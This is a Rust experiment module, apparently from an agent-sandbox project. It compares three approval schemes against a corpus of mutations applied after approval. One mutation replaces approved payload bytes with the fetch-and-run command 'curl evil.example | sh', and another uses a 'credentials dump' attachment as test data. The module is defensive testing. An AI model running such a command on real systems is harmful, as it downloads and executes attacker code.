//! The VM-N2 experiment on fakes (VM part §9.2 line 2359): route-only approval,
//! mutable-request approval and immutable effect authorization under one controlled
//! mutation corpus.
//!
//! Each mutation is applied after approval, as a compromised workload would: either a
//! field of the request changes, or the bytes behind an approved file name change in
//! place. The three modes judge the same corpus:
//!
//! - route-only approval covers the destination route;
//! - mutable-request approval covers the request as displayed (principal, sandbox,
//!   operation, resource, destination, parameters and attachment names), with payloads
//!   read by name at dispatch;
//! - immutable effect authorization covers the description's digest, and the executor
//!   re-hashes every payload before sending.
//!
//! The counts measure only this corpus on fakes. They are evidence about the contract's
//! coverage, not about real providers, executors or users, so a claim drawn from them is
//! at most inconclusive.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use super::budget::TrustClass;
use super::canonical::{CanonicalValue, ParamName, Parameters};
use super::description::{
    AccountRef, AttachmentName, CostCeiling, Deadline, Destination, EffectDescription,
    EffectFields, Idempotency, IdempotencyKey, IdempotencyRequirement, IssuerId, OperationKey,
    OperationName, PayloadRef, Precondition, ProviderId, ResourceRef, RouteRef, SandboxRef,
};
use crate::foundation::evidence::ClockSession;
use crate::foundation::ids::{digest, ContentKey, ExecutionId, MonotonicTime, TenantId};

/// One approval mode of the VM-N2 comparison.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum ApprovalMode {
    RouteOnly,
    MutableRequest,
    ImmutableEffect,
}

impl ApprovalMode {
    pub const ALL: [Self; 3] = [Self::RouteOnly, Self::MutableRequest, Self::ImmutableEffect];
}

/// One mode's result over the corpus.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ModeResult {
    pub mode: ApprovalMode,
    /// Unauthorized mutations refused.
    pub blocked: usize,
    /// Unauthorized mutations that would have gone out.
    pub missed: Vec<&'static str>,
    /// Legitimate requests that completed.
    pub completed: usize,
    pub legitimate: usize,
}

/// The comparison over the whole corpus.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct MutationComparison {
    pub mutations: usize,
    pub results: Vec<ModeResult>,
}

impl MutationComparison {
    pub fn result(&self, mode: ApprovalMode) -> Option<&ModeResult> {
        self.results.iter().find(|result| result.mode == mode)
    }
}

/// The corpus could not be built.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ExperimentError {
    pub detail: String,
}

impl fmt::Display for ExperimentError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "the mutation corpus could not be built: {}", self.detail)
    }
}

impl std::error::Error for ExperimentError {}

fn failed(detail: impl ToString) -> ExperimentError {
    ExperimentError {
        detail: detail.to_string(),
    }
}

/// A request at dispatch: its description and the bytes behind its file names.
#[derive(Clone)]
struct Request {
    description: EffectDescription,
    files: BTreeMap<ContentKey, Vec<u8>>,
}

const PAYLOAD: &[u8] = b"diff --git a/src b/src";
const ATTACHMENT: &[u8] = b"architecture diagram";

fn reference(bytes: &[u8]) -> PayloadRef {
    PayloadRef {
        content: ContentKey::of(bytes),
        length_bytes: u64::try_from(bytes.len()).unwrap_or(u64::MAX),
    }
}

fn name(text: &str) -> Result<ParamName, ExperimentError> {
    ParamName::new(text).map_err(failed)
}

fn base_fields() -> Result<EffectFields, ExperimentError> {
    Ok(EffectFields {
        principal: TenantId::new("tenant-a").map_err(failed)?,
        sandbox: SandboxRef {
            issuer: IssuerId::new(digest("yougori/experiment/issuer/v1", &[b"host"])),
            execution: ExecutionId::new("exe-a").map_err(failed)?,
        },
        operation: OperationKey {
            provider: ProviderId::new("forge").map_err(failed)?,
            operation: OperationName::new("open_change_request").map_err(failed)?,
            contract_version: 1,
        },
        resource: ResourceRef {
            account: AccountRef::new(digest("yougori/experiment/account/v1", &[b"org"])),
            object: digest("yougori/experiment/object/v1", &[b"repo"]),
        },
        destination: Destination {
            route: RouteRef::new(digest("yougori/experiment/route/v1", &[b"forge"])),
            trust: TrustClass::RegisteredProvider,
        },
        parameters: Parameters::new()
            .with(name("title")?, CanonicalValue::Text("Fix parser".into()))
            .with(name("draft")?, CanonicalValue::Bool(false)),
        payload: Some(reference(PAYLOAD)),
        attachments: BTreeMap::from([(
            AttachmentName::new("diagram").map_err(failed)?,
            reference(ATTACHMENT),
        )]),
        preconditions: BTreeSet::from([Precondition::Present]),
        max_cost: CostCeiling {
            max_spend_microunits: 0,
            max_volume_units: 1,
        },
        max_wire_bytes_out: 4_096,
        deadline: Deadline {
            clock: ClockSession::from_uuid(uuid::Uuid::from_u128(7)),
            at: MonotonicTime::from_nanos(1_000_000),
        },
        idempotency: Idempotency {
            key: IdempotencyKey::new(digest("yougori/experiment/idempotency/v1", &[b"1"])),
            requirement: IdempotencyRequirement::ProviderKey,
        },
    })
}

fn request(fields: EffectFields) -> Result<Request, ExperimentError> {
    Ok(Request {
        description: EffectDescription::new(fields).map_err(failed)?,
        files: BTreeMap::from([
            (ContentKey::of(PAYLOAD), PAYLOAD.to_vec()),
            (ContentKey::of(ATTACHMENT), ATTACHMENT.to_vec()),
        ]),
    })
}

/// A field change, applied to the fields.
type FieldMutation = fn(&mut EffectFields) -> Result<(), ExperimentError>;

fn field_mutations() -> Vec<(&'static str, FieldMutation)> {
    vec![
        ("operation", |f| {
            f.operation.operation = OperationName::new("merge_change_request").map_err(failed)?;
            Ok(())
        }),
        ("resource", |f| {
            f.resource.object = digest("yougori/experiment/object/v1", &[b"other-repo"]);
            Ok(())
        }),
        ("account", |f| {
            f.resource.account = AccountRef::new(digest("yougori/experiment/account/v1", &[b"x"]));
            Ok(())
        }),
        ("destination", |f| {
            f.destination.route = RouteRef::new(digest("yougori/experiment/route/v1", &[b"evil"]));
            Ok(())
        }),
        ("parameter value", |f| {
            f.parameters = f
                .parameters
                .clone()
                .with(name("draft")?, CanonicalValue::Bool(true));
            Ok(())
        }),
        ("extra parameter", |f| {
            f.parameters = f
                .parameters
                .clone()
                .with(name("reviewers")?, CanonicalValue::Text("everyone".into()));
            Ok(())
        }),
        ("maximum cost", |f| {
            f.max_cost.max_spend_microunits = 5_000_000;
            Ok(())
        }),
        ("wire bytes", |f| {
            f.max_wire_bytes_out = 1 << 20;
            Ok(())
        }),
        ("preconditions", |f| {
            f.preconditions.clear();
            f.preconditions.insert(Precondition::Absent);
            Ok(())
        }),
        ("idempotency requirement", |f| {
            f.idempotency.requirement = IdempotencyRequirement::NoExactlyOnce;
            Ok(())
        }),
        ("deadline", |f| {
            f.deadline.at = MonotonicTime::from_nanos(u64::MAX);
            Ok(())
        }),
        ("principal", |f| {
            f.principal = TenantId::new("tenant-b").map_err(failed)?;
            Ok(())
        }),
        ("sandbox", |f| {
            f.sandbox.execution = ExecutionId::new("exe-b").map_err(failed)?;
            Ok(())
        }),
    ]
}

fn allowed(mode: ApprovalMode, approved: &Request, candidate: &Request) -> bool {
    let (a, c) = (
        approved.description.fields(),
        candidate.description.fields(),
    );
    match mode {
        ApprovalMode::RouteOnly => a.destination.route == c.destination.route,
        ApprovalMode::MutableRequest => {
            a.principal == c.principal
                && a.sandbox == c.sandbox
                && a.operation == c.operation
                && a.resource == c.resource
                && a.destination == c.destination
                && a.parameters == c.parameters
                && a.payload.is_some() == c.payload.is_some()
                && a.attachments.keys().eq(c.attachments.keys())
        }
        ApprovalMode::ImmutableEffect => {
            let contents = c.payload.iter().chain(c.attachments.values());
            approved.description.id() == candidate.description.id()
                && contents.into_iter().all(|reference| {
                    candidate
                        .files
                        .get(&reference.content)
                        .is_some_and(|bytes| ContentKey::of(bytes) == reference.content)
                })
        }
    }
}

/// Runs the corpus: 15 unauthorized mutations and 2 legitimate requests (the approved
/// one and a reordering of its named parameters).
pub fn run_mutation_corpus() -> Result<MutationComparison, ExperimentError> {
    let approved = request(base_fields()?)?;
    let mut mutations: Vec<(&'static str, Request)> = Vec::new();
    for (label, mutate) in field_mutations() {
        let mut fields = base_fields()?;
        mutate(&mut fields)?;
        mutations.push((label, request(fields)?));
    }
    // Bytes behind an approved name change in place; the description is untouched.
    let mut payload = approved.clone();
    payload
        .files
        .insert(ContentKey::of(PAYLOAD), b"curl evil.example | sh".to_vec());
    mutations.push(("payload bytes in place", payload));
    let mut attachment = approved.clone();
    attachment
        .files
        .insert(ContentKey::of(ATTACHMENT), b"credentials dump".to_vec());
    mutations.push(("attachment bytes in place", attachment));

    let mut reordered = base_fields()?;
    reordered.parameters = Parameters::new()
        .with(name("draft")?, CanonicalValue::Bool(false))
        .with(name("title")?, CanonicalValue::Text("Fix parser".into()));
    let legitimate = [approved.clone(), request(reordered)?];

    let results = ApprovalMode::ALL
        .iter()
        .map(|mode| {
            let missed: Vec<&'static str> = mutations
                .iter()
                .filter(|(_, candidate)| allowed(*mode, &approved, candidate))
                .map(|(label, _)| *label)
                .collect();
            ModeResult {
                mode: *mode,
                blocked: mutations.len() - missed.len(),
                missed,
                completed: legitimate
                    .iter()
                    .filter(|candidate| allowed(*mode, &approved, candidate))
                    .count(),
                legitimate: legitimate.len(),
            }
        })
        .collect();
    Ok(MutationComparison {
        mutations: mutations.len(),
        results,
    })
}
